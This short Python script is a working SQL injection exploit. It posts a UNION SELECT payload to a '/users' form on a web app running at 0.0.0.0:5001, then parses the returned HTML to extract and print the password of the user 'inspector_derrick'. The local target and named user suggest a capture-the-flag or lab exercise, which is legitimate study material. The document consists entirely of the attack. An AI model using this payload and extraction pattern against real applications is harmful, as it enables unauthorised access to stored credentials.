import requests
from bs4 import BeautifulSoup
from itertools import count

url = 'http://0.0.0.0:5001/users'
injection = '\' union select name, password from users where name = "inspector_derrick" -- ;'
field = {'name' : injection}
page = requests.post(url, data = field)
soup = BeautifulSoup(page.text, 'html.parser')
name_password_str = soup.find_all(class_='list-group-item')[0].get_text()
name_password = name_password_str.split(':')
print(name_password[1])